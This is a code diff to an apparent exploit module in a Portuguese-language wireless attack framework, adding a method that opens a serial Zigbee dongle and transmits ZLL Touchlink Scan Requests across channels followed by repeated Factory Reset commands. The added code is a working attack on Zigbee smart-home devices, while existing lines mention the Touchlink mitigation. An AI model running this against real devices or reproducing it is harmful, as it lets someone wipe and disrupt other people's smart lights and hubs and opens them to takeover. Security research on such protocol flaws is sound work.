@@ -3,6 +3,7 @@
 
 import os
 import struct
+import time
 
 from wirelessxpl.core.exploit import *
 from wirelessxpl.core.os_guard import OSRequirement, requires_os
@@ -153,6 +154,41 @@ class Exploit(Exploit):
         print_info("  attify-zigbee-framework: https://github.com/attify/attify-zigbee-framework")
         print_info("  Z2M (Zigbee2MQTT) em modo debug para análise de tráfego")
 
+        self._exploit()
+
         print_info("")
         print_info("CVE relacionados: sem CVE específico (falha de design do protocolo ZLL)")
         print_info("Mitigação: desativar Touchlink nas configurações do hub Zigbee")
+
+    def _exploit(self) -> None:
+        """E2E exploit: send Touchlink Scan + Factory Reset via serial dongle."""
+        iface = str(self.interface).strip()
+        if not iface:
+            print_warning("Sem dongle configurado: skip injeção real")
+            return
+
+        import serial
+        try:
+            ser = serial.Serial(iface, 115200, timeout=2)
+        except Exception as exc:
+            print_error(f"Falha ao abrir serial {iface}: {exc}")
+            return
+
+        inter_pan_id = struct.unpack("<I", os.urandom(4))[0]
+        scan_payload, used_id = _build_touchlink_scan_request(inter_pan_id)
+        channels = _TOUCHLINK_CHANNELS if self.scan_all_channels else [int(self.channel)]
+
+        print_status("Enviando ZLL Scan Request em canais Touchlink...")
+        for ch in channels:
+            ch_byte = struct.pack("B", ch)
+            ser.write(ch_byte + scan_payload)
+            time.sleep(0.1)
+
+        print_status(f"Enviando {self.reset_count} x Factory Reset...")
+        reset_payload = _build_factory_reset_command(used_id)
+        for _ in range(int(self.reset_count)):
+            ser.write(reset_payload)
+            time.sleep(float(self.reset_delay))
+
+        ser.close()
+        print_success("Factory Reset commands enviados com sucesso")
